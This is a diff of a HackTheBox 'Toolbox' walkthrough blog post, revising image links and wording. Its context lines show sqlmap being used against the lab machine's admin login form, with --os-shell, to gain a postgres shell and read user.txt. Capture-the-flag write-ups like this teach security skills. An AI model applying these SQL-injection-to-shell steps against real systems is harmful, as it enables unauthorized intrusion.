@@ -4,7 +4,7 @@ title: Hackthebox Toolbox Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-29/toolbox.png)
 
 # Explanation
 [Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
@@ -125,17 +125,18 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 ## 2. Getting User
 
 According to the SSL certificate, this server hosts `admin.megalogistic.com` for a virtualhost.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-29/toolbox.png)
 
-Add this entry to the `/etc/hosts` and access using web browser.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
+Add this entry to `/etc/hosts` and access using web browser.<br>
+We can find a login form for an administrator.
 ```
 root@kali:~# cat /etc/hosts | grep admin
 10.10.10.236 admin.megalogistic.com
 ```
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
 
-
-This page contains a login form, check if this login form has SQL injection.
+This page contains a login form, check if this login form has SQL injection.<br>
+We can use Burp Suite to create a text file for the further purpose.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
 ```
 root@kali:~# cat sqlmap.txt 
@@ -163,7 +164,7 @@ Cookie: PHPSESSID=3fd8d348d81c7d2683bbad164dc0f3ab
 username=test&password=test
 ```
 
-We can use SQLmap for this purpose.
+Then, try to find an SQL injection with sqlmap.
 ```
 root@kali:~# sqlmap -r sqlmap.txt --force-ssl
         ___
@@ -270,6 +271,7 @@ there were multiple injection points, please select the one to use for following
 root@kali:~# 
 ```
 
+We found couple of parameters that have SQL injection.
 Using `--os--shell` option, we can gain a shell session.<br>
 ```
 root@kali:~# sqlmap -r sqlmap.txt --force-ssl --os-shell
@@ -365,7 +367,7 @@ uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)
 postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ 
 ```
 
-`user.txt` is in the directory `hogehoge`.
+`user.txt` is in the directory `/var/lib/postgresql`.
 ```
 postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
 cat user.txt
